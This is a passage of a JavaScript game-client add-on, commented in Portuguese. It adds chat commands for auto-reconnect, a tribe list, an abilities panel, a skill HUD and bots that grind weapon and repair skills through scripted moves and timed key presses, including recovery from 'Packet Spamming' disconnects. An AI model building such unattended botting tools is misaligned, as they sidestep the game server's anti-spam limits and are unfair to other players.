        for (let i = 0; i < cols; i++) {
            await xDoBuild(tipo, 1); // sempre constrói pra direita
            await xDelay(300);

            if (i < cols - 1) {
                // Anda pra baixo ou pra cima dependendo da linha
                const ny = goingDown ? myself.y + 1 : myself.y - 1;
                await xDoMove(myself.x, ny);
                await xDelay(400);
            }
        }

        if (row < rows - 1) {
            // Anda 1 pra esquerda pra próxima coluna
            await xDoMove(myself.x - 1, myself.y);
            await xDelay(400);
        }
    }

    dsk.localMsg('BuildSnake: concluido!', '#5f5');
});

dsk.reconnect = { enabled: false };

// Limpa o interval anterior se existir
if (window._alInterval) clearInterval(window._alInterval);
if (window._alIntervalStart) clearInterval(window._alIntervalStart);

window.alGoing  = false;
window.hasNotif = false;

async function autolog() {
    if (!dsk.reconnect.enabled) return;
    if (alGoing === true) return;
    alGoing = true;

    if (myself === undefined && hasNotif === true) {
        if (connection !== undefined) {
            if (connection.readyState === 3 && jv.selected_ip !== undefined) {
                await xDelay(10000);
                do_connect();
                await xDelay(5000);
            } else if (connection.readyState === 1) {
                send({
                    type: 'login',
                    user: jv.base64_encode(jv.login_dialog.username.chars.trim()),
                    pass: jv.base64_encode(jv.login_dialog.password.chars.trim()),
                });
                await xDelay(20000);
            }
        }
    } else {
        if (myself !== undefined) {
            await xDelay(8000);
            hasNotif = true;
        }
    }

    alGoing = false;
}

function startautolog() {
    if (myself !== undefined) {
        hasNotif = true;
        window._alInterval = setInterval(autolog, 8000);
        clearInterval(window._alIntervalStart);
    }
}

dsk.setCmd('/reconnect', () => {
    dsk.reconnect.enabled = !dsk.reconnect.enabled;

    if (dsk.reconnect.enabled) {
        hasNotif  = false;
        alGoing   = false;
        window._alIntervalStart = setInterval(startautolog, 1500);
        dsk.localMsg('AutoReconnect: Ativado', '#5f5');
    } else {
        clearInterval(window._alInterval);
        clearInterval(window._alIntervalStart);
        hasNotif = false;
        alGoing  = false;
        dsk.localMsg('AutoReconnect: Desativado', '#f55');
    }
});

// ── TRIBE MANAGER ─────────────────────────────────────────────

dsk.tribeManager = jv.Dialog.create(400, 300);
const tm = dsk.tribeManager;
tm.visible = false;

tm.header = jv.text('Tribe List', {
  font: '16px Verdana',
  fill: 0xFFD700,
  stroke: 0x555555,
  strokeThickness: 2,
});
tm.addChild(tm.header);
jv.center(tm.header);
jv.top(tm.header, 4);

tm.close = jv.Button.create(0, 0, 24, 'X', tm, 24);
jv.top(tm.close, 4);
jv.right(tm.close, 4);
tm.close.on_click = () => (tm.visible = 0);

tm.move = jv.Button.create(0, 0, 24, '@', tm, 24);
jv.top(tm.move, 4);
jv.right(tm.move, 28);

tm._px = 0;
tm._py = 0;
window.addEventListener('mousemove', e => { tm._px = e.clientX; tm._py = e.clientY; });
window.addEventListener('touchmove', e => { tm._px = e.touches[0].clientX; tm._py = e.touches[0].clientY; });

tm.updatePosition = () => {
  if (tm.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    tm.x = (tm._px - rect.left) * (jv.game_width / rect.width) - tm.w / 2;
    tm.y = (tm._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (tm.x < 0) tm.x = 0;
  if (tm.y < 0) tm.y = 0;
  if (tm.x + tm.w > jv.game_width)  tm.x = jv.game_width - tm.w;
  if (tm.y + tm.h > jv.game_height) tm.y = jv.game_height - tm.h;
};
dsk.on('postLoop', tm.updatePosition);

// Label de conteúdo
tm.content = jv.text('', {
  font: '11px Verdana',
  fill: 0xffffff,
  stroke: 0x000000,
  strokeThickness: 2,
  lineJoin: 'round',
});
tm.content.x = tm.w - 60;
tm.content.y = 35;
tm.addChild(tm.content);

// Paginação
tm.page = 0;
tm.perPage = 17;
tm.members = [];

tm.btnPrev = jv.Button.create(0, 0, 24, '<', tm, 24);
jv.bottom(tm.btnPrev, 4);
tm.btnPrev.x = tm.w - 58;
tm.btnPrev.on_click = () => {
  if (tm.page > 0) { tm.page--; tm.render(); }
};

tm.btnNext = jv.Button.create(0, 0, 24, '>', tm, 24);
jv.bottom(tm.btnNext, 4);
tm.btnNext.x = tm.w - 30;
tm.btnNext.on_click = () => {
  const maxPage = Math.ceil(tm.members.length / tm.perPage) - 1;
  if (tm.page < maxPage) { tm.page++; tm.render(); }
};

tm.pageLabel = jv.text('', {
  font: '11px Verdana',
  fill: 0xffffff,
  stroke: 0x000000,
  strokeThickness: 2,
});
tm.pageLabel.x = tm.w - 100;
jv.bottom(tm.pageLabel, 8);
tm.addChild(tm.pageLabel);

tm.rankColor = { L: '#FFD700', E: '#FF8C00', M: '#00BFFF', R: '#ffffff' };

tm.parse = (text) => {
  const matches = [...text.matchAll(/(\S+)\((\d+)([A-Z])\)/g)];
  return matches.map(m => ({
    name:  m[1],
    level: parseInt(m[2]),
    rank:  m[3],
  })).sort((a, b) => b.level - a.level);
};

tm.render = () => {
  const start = tm.page * tm.perPage;
  const slice = tm.members.slice(start, start + tm.perPage);
  const maxPage = Math.ceil(tm.members.length / tm.perPage);

  // Remove labels antigas
  if (tm.lines) tm.lines.forEach(l => tm.removeChild(l));
  tm.lines = [];

  slice.forEach((m, i) => {
    const color = tm.rankColor[m.rank] ?? '#ffffff';
    const label = jv.text(`[${m.rank}] ${m.name} — Lv ${m.level}`, {
      font: '11px Verdana',
      fill: color,
      stroke: 0x000000,
      strokeThickness: 2,
      lineJoin: 'round',
    });
    label.x = 10;
    label.y = 35 + i * 15;
    tm.addChild(label);
    tm.lines.push(label);
  });

  tm.header.text = `Tribe List (${tm.members.length})`;
  tm.pageLabel.text = `${tm.page + 1}/${maxPage}`;
  jv.center(tm.header);
};

// Aguarda resposta do /tribe list
tm.waiting = false;

dsk.on('postPacket:pkg', packet => {
  if (!tm.waiting) return;
  if (!packet?.data) return;

  try {
    const arr = JSON.parse(packet.data);
    arr.forEach(raw => {
      const item = JSON.parse(raw);
      if (item.type !== 'message') return;

      const text = dsk.stripHTMLTags(item.text);
      if (!text.includes('members:')) return;

      const members = tm.parse(text);
		tm.members = members;
		tm.page = 0;
		tm.render();
		tm.waiting = false;
    });
  } catch (e) {}
});

dsk.setCmd('/tlist', () => {
  tm.visible = true;
  tm.waiting = true;
  tm.content.text = 'Loading...';
  _originalSend({ type: 'chat', data: '/tribe list' });
  dsk.localMsg('Tribe List: carregando...', '#0ff');
});

// ── ABLMANAGER ───────────────────────────────────────────────

dsk.ablManager = jv.Dialog.create(250, 120);
const am = dsk.ablManager;

dsk.setCmd('/abl', () => {
  const visible = !am.visible;
  am.visible = visible;
  dsk.localMsg(`AblManager: ${visible ? 'Ativado' : 'Desativado'}`, visible ? '#5f5' : '#f55');
});

am.header = jv.text('Abilities', {
  font: '18px Verdana',
  fill: 0xffffff,
  lineJoin: 'round',
  stroke: 0x555555,
  strokeThickness: 2,
});
am.addChild(am.header);
jv.center(am.header);
jv.top(am.header, 4);

am.close = jv.Button.create(0, 0, 24, 'X', am, 24);
jv.top(am.close, 4);
jv.right(am.close, 4);
am.close.on_click = () => (am.visible = 0);

// Botão de mover (igual ao invManager)
am.move = jv.Button.create(0, 0, 24, '@', am, 24);
jv.top(am.move, 4);
jv.right(am.move, 28);

am._px = 0;
am._py = 0;
window.addEventListener('mousemove', e => { am._px = e.clientX; am._py = e.clientY; });
window.addEventListener('touchmove', e => { am._px = e.touches[0].clientX; am._py = e.touches[0].clientY; });

am.updatePosition = () => {
  if (am.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    const scaleX = jv.game_width / rect.width;
    const scaleY = jv.game_height / rect.height;
    am.x = (am._px - rect.left) * scaleX - am.w / 2;
    am.y = (am._py - rect.top) * scaleY - 12;
  }
  if (am.x < 0) am.x = 0;
  if (am.y < 0) am.y = 0;
  if (am.x + am.w > jv.game_width)  am.x = jv.game_width - am.w;
  if (am.y + am.h > jv.game_height) am.y = jv.game_height - am.h;
};
dsk.on('postLoop', am.updatePosition);

am.slots = [];
am.marginLeft = 10;
am.marginTop = 60;
am.drag = null;

am.dragMove = e => {
  if (am.drag && e) {
    am.drag.x = e.data.getLocalPosition(am).x - 16;
    am.drag.y = e.data.getLocalPosition(am).y - 16;
  }
};

am.endDrag = () => {
  if (!am.drag) return;
  am.drag.off('pointermove', am.dragMove);
  am.drag.off('pointerup', am.dragEnd);
  am.drag.off('pointerupoutside', am.dragEnd);
  am.drag.x = am.drag.staticX;
  am.drag.y = am.drag.staticY;
  am.drag.scale.set(1);
  am.drag.z = 50;
  am.drag = null;
};

am.dragEnd = e => {
  const tX = e.data.getLocalPosition(am).x - am.marginLeft;
  const tY = e.data.getLocalPosition(am).y - am.marginTop;
  const slot = am.slots.find(s => {
    const eX = s.x - am.marginLeft;
    const eY = s.y - am.marginTop;
    return s !== am.drag && tX > eX && tX < eX + s.width && tY > eY && tY < eY + s.height;
  });
  if (slot) send({ type: 'chat', data: `/swap ${am.drag.index} ${slot.index}` });
  am.endDrag();
};

am.setDrag = w => {
  am.drag = w;
  am.drag.on('pointermove', am.dragMove);
  am.drag.on('pointerup', am.dragEnd);
  am.drag.on('pointerupoutside', am.dragEnd);
  am.drag.scale.set(2);
  am.drag.z = 100;
  am.children.sort(zCompare);
};

am.clearSlots = () => {
  am.slots.forEach(s => (s.texture = dsk.textureById(791)));
};

am.drawInv = function () {
  for (let i = 1; i < 7; i++) {
    const slot = new PIXI.Sprite(dsk.textureById(791));
    slot.index = 7 - i;
    slot.z = 50;
    slot.staticX = am.marginLeft + i * 32 - 20;
    slot.staticY = am.marginTop;
    slot.x = slot.staticX;
    slot.y = slot.staticY;
    slot.interactive = true;
    slot.buttonMode = true;
    slot.on('pointerdown', () => am.setDrag(slot));
    slot.title = jv.text(slot.index, { font: '14px Verdana', fill: 0xffffff });
    slot.addChild(slot.title);
    slot.title.x += 10;
    slot.title.y -= 16;
    am.slots.push(slot);
    am.addChild(slot);
  }
};
am.drawInv();

am.updateInv = () => {
      if (!jv.abl) return; // ← adiciona essa linha
  am.clearSlots();
  const arr = [...am.slots].reverse();
  for (let i = 0; i < jv.abl.length; i++) {
    const abl = jv.abl[i];
    if (abl) arr[i].texture = dsk.textureById(abl.spr);
  }
};
am.updateInv();
dsk.on('postPacket:abl', am.updateInv);

// ── GUI ──────────────────────────────────────────────────────

dsk.initGui = () => {
  // Botão de eval removido por segurança
};

dsk.init = () => {
  // nada por enquanto
};

// ── ARMAS BOT ─────────────────────────────────────────────────

window.autoArmas    = false;
window.emTroca      = false;
window.slotAtual    = 2;
window.skillLevel   = 0;
window.currentLevel = 0;
window.skillName    = '';
window.xGoing       = new Array(10).fill(false);
window.xCurrentTool = undefined;
window.acao         = [];

// ── SKILL TRACKER ─────────────────────────────────────────────

window.skillName  = '';
window.skillLevel = 0;

dsk.on('postPacket:pkg', packet => {
  if (!packet?.data) return;
  try {
    const arr = JSON.parse(packet.data);
    arr.forEach(raw => {
      const item = JSON.parse(raw);

      // Atualiza skillName pelo packet de hit
      if (item.type === 's' && item.t) {
        const newName = item.t.toLowerCase();
        if (newName !== skillName) {
          skillName = newName;
          skillLevel = 0; // reseta ao trocar de skill
        }
        // Lê o nível real do jv.skills se disponível
        if (jv.skills?.[skillName]?.[1] !== undefined) {
          skillLevel = Math.floor(jv.skills[skillName][1]);
        }
      }

      // Captura level up pela mensagem no chat — fonte mais confiável
      if (item.type === 'message') {
        const text = dsk.stripHTMLTags(item.text);
        const match = text.match(/Your (.+?) skill is now level (\d+)/i);
        if (match) {
          skillName  = match[1].toLowerCase();
          skillLevel = parseInt(match[2]);
          if (jv.skills?.[skillName]) {
            jv.skills[skillName][1] = skillLevel;
          }
        }
      }
    });
  } catch (e) {}
});

// Lê jv.skills continuamente no loop — não depende de abrir a aba
dsk.on('postLoop', () => {
  if (!skillName) return;
  if (jv.skills?.[skillName]?.[1] !== undefined) {
    skillLevel = Math.floor(jv.skills[skillName][1]);
  }
});

// ── SKILL HUD ─────────────────────────────────────────────────

dsk.skillHud = {
  enabled: false,
  dragging: false,
  ox: 0,
  oy: 0,
};

dsk.skillHud.label = jv.text('', {
  font: '13px Verdana',
  fill: 0xFFD700,
  stroke: 0x000000,
  strokeThickness: 3,
  lineJoin: 'round',
  align: 'left',
});
dsk.skillHud.label.x = 8;
dsk.skillHud.label.y = 45;
dsk.skillHud.label.visible = false;
dsk.skillHud.label.interactive = true;
dsk.skillHud.label.buttonMode = true;
ui_container.addChild(dsk.skillHud.label);

// Drag
dsk.skillHud.label.on('pointerdown', e => {
  dsk.skillHud.dragging = true;
  const pos = e.data.getLocalPosition(ui_container);
  dsk.skillHud.ox = pos.x - dsk.skillHud.label.x;
  dsk.skillHud.oy = pos.y - dsk.skillHud.label.y;
});
dsk.skillHud.label.on('pointermove', e => {
  if (!dsk.skillHud.dragging) return;
  const pos = e.data.getLocalPosition(ui_container);
  dsk.skillHud.label.x = pos.x - dsk.skillHud.ox;
  dsk.skillHud.label.y = pos.y - dsk.skillHud.oy;
});
dsk.skillHud.label.on('pointerup', () => { dsk.skillHud.dragging = false; });
dsk.skillHud.label.on('pointerupoutside', () => { dsk.skillHud.dragging = false; });

dsk.on('postLoop', () => {
  if (!dsk.skillHud.enabled) return;
  const name   = skillName  || '---';
  const level  = skillLevel ?? 0;
  const target = currentLevel > 0 ? ` / ${currentLevel}` : '';
  const pct    = skill_status?.val != null ? Math.floor(skill_status.val) : 0;
  dsk.skillHud.label.text = `⚔ ${name}: ${level}.${pct}${target}`;
});

dsk.setCmd('/skills', () => {
  dsk.skillHud.enabled = !dsk.skillHud.enabled;
  dsk.skillHud.label.visible = dsk.skillHud.enabled;
  dsk.localMsg(`Skill HUD: ${dsk.skillHud.enabled ? 'Ativado' : 'Desativado'}`, dsk.skillHud.enabled ? '#5f5' : '#f55');
});

// ── ARMAS CONFIG MANAGER ──────────────────────────────────────


dsk.armasManager = jv.Dialog.create(260, 220);
const acm = dsk.armasManager;
acm.visible = false;

acm.header = jv.text('Armas Bot Config', {
  font: '14px Verdana',
  fill: 0xFFD700,
  stroke: 0x555555,
  strokeThickness: 2,
});
acm.addChild(acm.header);
jv.center(acm.header);
jv.top(acm.header, 4);

acm.close = jv.Button.create(0, 0, 24, 'X', acm, 24);
jv.top(acm.close, 4);
jv.right(acm.close, 4);
acm.close.on_click = () => (acm.visible = 0);

acm.move = jv.Button.create(0, 0, 24, '@', acm, 24);
jv.top(acm.move, 4);
jv.right(acm.move, 28);

acm._px = 0;
acm._py = 0;
window.addEventListener('mousemove', e => { acm._px = e.clientX; acm._py = e.clientY; });
window.addEventListener('touchmove', e => { acm._px = e.touches[0].clientX; acm._py = e.touches[0].clientY; });

acm.updatePosition = () => {
  if (acm.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    acm.x = (acm._px - rect.left) * (jv.game_width / rect.width) - acm.w / 2;
    acm.y = (acm._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (acm.x < 0) acm.x = 0;
  if (acm.y < 0) acm.y = 0;
  if (acm.x + acm.w > jv.game_width)  acm.x = jv.game_width - acm.w;
  if (acm.y + acm.h > jv.game_height) acm.y = jv.game_height - acm.h;
};
dsk.on('postLoop', acm.updatePosition);

// ── Labels ──
const makeLabel = (text, y) => {
  const l = jv.text(text, { font: '11px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  l.x = 10;
  l.y = y;
  acm.addChild(l);
  return l;
};

makeLabel('Nivel alvo:', 40);
makeLabel('Slot inicial:', 80);
makeLabel('Skill name:', 120);

// ── Status labels (valores atuais) ──
acm.lblLevel = makeLabel(`atual: ${window.currentLevel ?? 0}`, 55);
acm.lblSlot  = makeLabel(`atual: ${window.slotAtual ?? 1}`, 95);
acm.lblSkill = makeLabel(`atual: ${window.skillName || 'none'}`, 135);

acm.refresh = () => {
  acm.lblLevel.text = `atual: ${currentLevel}`;
  acm.lblSlot.text  = `atual: ${slotAtual}`;
  acm.lblSkill.text = `atual: ${skillName || 'none'}`;
};
// ── Labels em tempo real ──
acm.lblSkillCurrent = makeLabel('skill: -', 158);
acm.lblSkillLvl     = makeLabel('nivel: -', 173);

// Atualiza em tempo real no postLoop
dsk.on('postLoop', () => {
  if (!acm.visible) return;
  acm.lblSkillCurrent.text = `skill: ${skillName || 'none'}`;
  acm.lblSkillLvl.text     = `nivel: ${skillLevel ?? 0}`;
});
// ── Botões +/- para nivel alvo ──
const baseX = 130;
const y = 38;
const spacing = 25;

// 🔻 -10
const btnLevelDown10 = jv.Button.create(0, 0, 30, '-10', acm, 20);
btnLevelDown10.x = baseX;
btnLevelDown10.y = y;
btnLevelDown10.on_click = () => { 
  currentLevel = Math.max(0, currentLevel - 10); 
  acm.refresh(); 
};

// 🔻 -1
const btnLevelDown = jv.Button.create(0, 0, 20, '-', acm, 20);
btnLevelDown.x = baseX + spacing;
btnLevelDown.y = y;
btnLevelDown.on_click = () => { 
  if (currentLevel > 0) currentLevel--; 
  acm.refresh(); 
};

// 🔺 +1
const btnLevelUp = jv.Button.create(0, 0, 20, '+', acm, 20);
btnLevelUp.x = baseX + spacing * 2;
btnLevelUp.y = y;
btnLevelUp.on_click = () => { 
  currentLevel++; 
  acm.refresh(); 
};

// 🔺 +10
const btnLevelUp10 = jv.Button.create(0, 0, 30, '+10', acm, 20);
btnLevelUp10.x = baseX + spacing * 3;
btnLevelUp10.y = y;
btnLevelUp10.on_click = () => { 
  currentLevel = Math.min(100, currentLevel + 10); 
  acm.refresh(); 
};

// ── Botões +/- para slot inicial ──
const btnSlotDown = jv.Button.create(0, 0, 20, '-', acm, 20);
btnSlotDown.x = 130; btnSlotDown.y = 78;
btnSlotDown.on_click = () => { if (slotAtual > 2) slotAtual--; acm.refresh(); };

const btnSlotUp = jv.Button.create(0, 0, 20, '+', acm, 20);
btnSlotUp.x = 155; btnSlotUp.y = 78;
btnSlotUp.on_click = () => { slotAtual++; acm.refresh(); };

// ── Botões de skill name ──
const skills = ['repairing'];
let skillIdx = 0;

const btnSkill = jv.Button.create(0, 0, 80, skills[0], acm, 20);
btnSkill.x = 130; btnSkill.y = 118;
btnSkill.on_click = () => {
  skillIdx = (skillIdx + 1) % skills.length;
  skillName = skills[skillIdx];
  btnSkill.label.text = skillName;
  acm.refresh();
};

// ── Botão skip water no painel skill config ───────────────────
const btnSkipWater = jv.Button.create(0, 0, 150, 'Ignorar Água [OFF]', acm, 20);
btnSkipWater.x = 100;
btnSkipWater.y = 148; // abaixo dos botões existentes

btnSkipWater.on_click = () => {
  dsk.farm.skipWater = !dsk.farm.skipWater;
  btnSkipWater.title.text = `Ignorar Água [${dsk.farm.skipWater ? 'ON' : 'OFF'}]`;
  btnSkipWater.style.fill = dsk.farm.skipWater ? 0x44bb44 : 0xbb4444;
  dsk.localMsg(`Farm skipWater: ${dsk.farm.skipWater ? 'ON' : 'OFF'}`, dsk.farm.skipWater ? '#5f5' : '#f55');
};

// Atualiza cor em tempo real
dsk.on('postLoop', () => {
  if (!acm.visible) return;
  btnSkipWater.tint = dsk.farm.skipWater ? 0x44bb44 : 0xbb4444;
});

// ── Comando ──
dsk.setCmd('/skillconfig', () => {
  acm.visible = !acm.visible;
  if (acm.visible) acm.refresh();
  dsk.localMsg(`Skill Config: ${acm.visible ? 'Aberto' : 'Fechado'}`, acm.visible ? '#5f5' : '#f55');
});

function xGetWallByPos(x, y) {
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (obj && obj.can_pickup == 0 && obj.x == x && obj.y == y) {
      return obj;
    }
  }
  return null;
}

function xGetWallHp(x, y) {
  const wall = xGetWallByPos(x, y);
  if (wall && wall.hpbar) {
    return (wall.hpbar.val / wall.hpbar.max) * 100;
  }
  return -1;
}

function xGetSlotByID(id) {
  for (let i in inv) {
    if (inv[i]?.sprite == id) return parseInt(i);
  }
}

function xGetItemNameBySlot(id) {
  for (let i in item_data) {
    if (item_data[i].slot == id) return item_data[i].n;
  }
}

async function xDoDropSlot(amount, slot) {
  send({ type: "d", slot: slot - 1, amt: amount });
  await xDelay(269);
}

async function xDoDropByID(amount, id) {
  send({ type: "d", slot: xGetSlotByID(id), amt: amount });
  await xDelay(267);
}

async function xLookUp() {
  await xDelay(263);
  await xDoKeyDown(4);
  await xDelay(193);
  await xDoKeyPress(2, 224);
  await xDelay(181);
  await xDoKeyUp(4);
  await xDelay(262);
}

async function xLookDown() {
  await xDelay(266);
  await xDoKeyDown(4);
  await xDelay(198);
  await xDoKeyPress(3, 231);
  await xDelay(199);
  await xDoKeyUp(4);
  await xDelay(268);
}

async function Armas() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  
  // ← 687 precisa ser checado ANTES do lock
  if (inv[0]?.sprite === 687) {
    dsk.armas.enabled = false;
    xGoing[0] = false;
    xDoKeyUp(6);
    dsk.localMsg('Armas Bot: Desativado', '#f55');
    return;
  }

  if (skillLevel >= currentLevel && currentLevel > 0 && skillName !== 'repairing' && !emTroca) {
    emTroca = true;
    await xDoKeyUp(6);
    await xDelay(600);
    await xDoSwapSlot(1, slotAtual);
    await xDelay(500);
    await xDoUseSlot(0);
    await xDelay(500);
    skillLevel = 0;
    await xDelay(500);
    await xDoKeyUp(6);
    await xDelay(2000);
    emTroca = false;
    slotAtual++;
    await xDelay(1000);
    return;
  }

  if (xIfChatHas("Disconnected (Packet Spamming)")) {
    await xDelay(500);
    keySpace.isDown = false;
	xGoing[0] = false;
    await xDoClearChat("Disconnected (Packet Spamming)");
    await xDelay(500);
    await xDoKeyUp(6);
    await xDelay(500);
    return;
  }

  if (xIfChatHas("Welcome back ")) {
    await xDelay(800);
    await xDoClearChat("Welcome back ");
    await xDelay(800);
    await xDoKeyUp(6);
    await xDelay(500);
  }

  if (xGoing[0] === true) return;
  xGoing[0] = true;

  if (inv[0].sprite === 719) {
    // ── COM REPAIR KIT ──────────────────────────────

    if (inv[0].equip === 2) {

      if (dsk.armas.repairingTarget === 'dummy') {
		await xDoKeyUp(6);
	    await xDelay(630);
        await xDoMove(myself.x - 1, myself.y);
        await xDelay(820);
        await xDoDropSlot(1, 1);
        await xDelay(610);
        await xDoMove(myself.x + 2, myself.y);
        await xDelay(1205);
        await xDoPickUp();
        await xDelay(550);
        await xDoUseSlot(0);
        await xDelay(510);
        await xDoMove(myself.x - 1, myself.y);
        await xDelay(805);
        await xDoChangeDir(0);
        await xDelay(604);
		await xDoKeyUp(6);

      } else {
		await xDoKeyUp(6);
	    await xDelay(630);
        await xDoMove(myself.x - 2, myself.y);
        await xDelay(1205);
        await xDoDropSlot(1, 1);
        await xDelay(620);
        await xDoMove(myself.x + 2, myself.y);
        await xDelay(1210);
        await xDoPickUp();
        await xDelay(503);
        await xDoUseSlot(0);
        await xDelay(502);
        await xDoChangeDir(3);
        await xDelay(506);
		await xDoKeyUp(6);
      }

      dsk.armas.repairingTarget = null;
      xGoing[0] = false;
      return;
    }
	await xDelay(567);
	await xDoKeyPress(6, 189);

    if (xIfChatHas("is in perfect condition")) {
      xDoClearChat("is in perfect condition");
      dsk.armas.repairing = false;
	  dsk.armas.repairingTarget = 'dummy'; // ← novo

      // Volta pra x → vira pra cima
	  await xDelay(630);
      await xDoMove(myself.x - 1, myself.y);
      await xDelay(608);
      await xDoChangeDir(0);
      await xDelay(612);

      // Repara Dummy N — 1 toque para revelar HP, depois repara enquanto < 90%
      await xDoKeyPress(6, 185); await xDelay(560);
      while (xGetWallHp(myself.x, myself.y - 1) < 90 && xGetWallHp(myself.x, myself.y - 1) !== -1) {
        await xDoKeyPress(6, 184);
        await xDelay(561);
      }

      // Vai pra x+1 → dropa kit
	  await xDelay(630);
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(560);
      await xDoDropSlot(1, 1);
      await xDelay(652);

      // Volta pra x → pega arma → equipa → vira pra cima
	  await xDelay(630);
      await xDoMove(myself.x - 1, myself.y);
      await xDelay(560);
      await xDoPickUp();
      await xDelay(530);
      await xDoUseSlot(0);
      await xDelay(540);
      await xDoChangeDir(0); 
	  await xDelay(510);

    } else if (dsk.armas.repairing) {
      // Aguardando "is in perfect condition"
      xGoing[0] = false;
      return;
    }

  } else {
    // ── COM ARMA ──────────────────────────────────

    // Equipa slot 0 se desequipado
    if (inv[0].equip === 0) {
      await xDoUseSlot(0);
      await xDelay(610);
    }

    // Dummy com HP baixo → inicia reparo do dummy
    if (xGetWallHp(myself.x, myself.y - 1) <= 20 && xGetWallHp(myself.x, myself.y - 1) !== -1) {
      dsk.armas.repairing = true;
	  await xDelay(545);
	  await xDoKeyUp(6);
	  await xDelay(567);
      await xDoDropSlot(1, 1);
	  await xDelay(630);

      await xDoMove(myself.x + 1, myself.y);
      await xDelay(632);
      await xDoPickUp();
      await xDelay(610);

      await xDoChangeDir(3);
      await xDelay(610);
      await xDoUseSlot(0);
      await xDelay(630);

      xGoing[0] = false;
      return;
    }

    // Arma gasta (equip == 2) — inicia sequência de reparo da arma
    if (inv[0].equip === 2) {
      dsk.armas.repairing = true;
      dsk.armas.repairingTarget = 'arma'; // ← novo

      // Dropa arma em x
	  await xDoKeyUp(6);
	  await xDelay(649);
      await xDoDropSlot(1, 1);
      await xDelay(630);

      // Vai pra x+1 → pega kit
	  await xDelay(630);
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(633);
      await xDoPickUp();
      await xDelay(540);

      // Vira pra esquerda → equipa kit
      await xDelay(620);
      await xDoChangeDir(3);
      await xDelay(610);
      await xDoUseSlot(0);
      await xDelay(610);

      xGoing[0] = false;
      return;
    }

    // Ataca se parado e com arma equipada
    if (!keySpace.isDown && inv[0].sprite !== undefined && inv[0].equip === 1) {
      await xDoKeyDown(6);
      await xDelay(832);
    }
  }

  xGoing[0] = false;
}

dsk.armas = { enabled: false, repairing: false };

dsk.setCmd('/armas', () => {
  dsk.armas.enabled = !dsk.armas.enabled;

  if (dsk.armas.enabled) {
    dsk.armas.repairing = false;
    dsk.localMsg('Armas Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.armas.enabled) {
        await Armas();
        await xDelay(800);
      }
    })();
  } else {
    xGoing[0] = false;
    xDoKeyUp(6);
    dsk.armas.repairing = false;
    dsk.localMsg('Armas Bot: Desativado', '#f55');
  }
});

// ── DESTRUCTION BOT ────────────────────────────────────────────

window.destructPosX = 0;
window.destructPosY = 0;
dsk.destruction = { enabled: false };

async function Destruction() {
	if (dskPaused) return; // ← adiciona isso
    if (!myself || game_state !== 2) return;

	if (currentLevel > 0 && skillLevel >= currentLevel && ['destruction'].includes(skillName)) {
	await xDoKeyUp(6);
    await xDelay(1621);
	xGoing[110] = false;
	dsk.destruction.enabled = false;
	dsk.localMsg('Destruction: Desativado', '#f55');
    return;
	}

  if (xGoing[110] != true) {
    xGoing[110] = true;

    // Sem item no slot 0 — pega repair kit
    if (inv[0].sprite == undefined) {
      if (xGetSlotByID(719) == undefined) {
		  await xDelay(535);
		  await xDoPickUp();
		  await xDelay(537);
	  }
      await xDoUseSlotByID(xGetSlotByID(719));
      await xDelay(559);
    }

    // Equipa se desequipado
    if (inv[0].equip == 0) {
      if (keySpace.isDown) keySpace.isDown = false;
	  await xDelay(624);
      await xDoUseSlot(0);
      await xDelay(615);
    }

    if (myself.x == destructPosX - 1 && myself.y == destructPosY && inv[0].sprite == 719) {
      try {
		  await xDelay(523);
		  await xDoKeyPress(6, 218);
		  await xDelay(523);
        if (xIfChatHas("is in perfect condition")) {
          xDoClearChat("is in perfect condition");
          await xDelay(613);
          await xDoMove(myself.x + 1, myself.y);
          await xDelay(554);
        }
      } catch(e) {}
    } else if (myself.x == destructPosX - 1 && myself.y == destructPosY && inv[0].sprite != 719) {
      await xDelay(457);
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(453);
    } else if (inv[0].sprite == 719) {

      // Repara parede oeste
      if (xGetWallHp(myself.x + 1, myself.y) >= 90) {
		await xDelay(623);
		await xDoKeyPress(6, 186);
		await xDelay(623);
        await xDoChangeDir(0);
        await xDelay(645);
      }
      // Repara parede norte
      if (xGetWallHp(myself.x, myself.y - 1) >= 90) {
		await xDelay(623);
		await xDoKeyPress(6, 187);
		await xDelay(623);
        await xDoChangeDir(2);
        await xDelay(630);
      }
      // Repara parede sul
      if (xGetWallHp(myself.x, myself.y + 1) >= 90) {
		await xDelay(623);
		await xDoKeyPress(6, 188);
		await xDelay(623);
        await xDoMove(myself.x - 1, myself.y);
        await xDelay(415);
        await xDoDropSlot(1, 1);
        await xDelay(420);
        if (keySpace.isDown) keySpace.isDown = false;
        await xDelay(630);
        await xDoMove(myself.x + 1, myself.y);
        await xDelay(528);
      }
      // Kit gasto
      if (inv[0].equip == 2) {
		if (keySpace.isDown) keySpace.isDown = false;
		await xDelay(423);
        await xDoMove(myself.x - 2, myself.y);
        await xDelay(635);
        await xDoDropSlot(1, 1);
        await xDelay(641);
        await xDoMove(myself.x + 1, myself.y);
        await xDelay(452);
        if (xGetSlotByID(719) == undefined) await xDoPickUp();
        await xDelay(430);
        await xDoUseSlot(0);
        await xDelay(654);
        await xDoMove(myself.x + 1, myself.y);
        await xDelay(453);
      }
    } else {
      // Sem repair kit — dropa arma gasta
      if (inv[0].equip == 2) {
		  await xDelay(523);
		if (keySpace.isDown) keySpace.isDown = false;
		await xDelay(634);
        await xDoDropSlot(1, 1);
        await xDelay(756);
        await xDoMove(myself.x - 1, myself.y);
        await xDelay(740);
        await xDoChangeDir(1);
        await xDelay(723);
      }
      // Parede a leste com hp baixo
      const wallEast = xGetWallByPos(myself.x + 1, myself.y);
      if (wallEast?.hpbar?.val <= 25) {
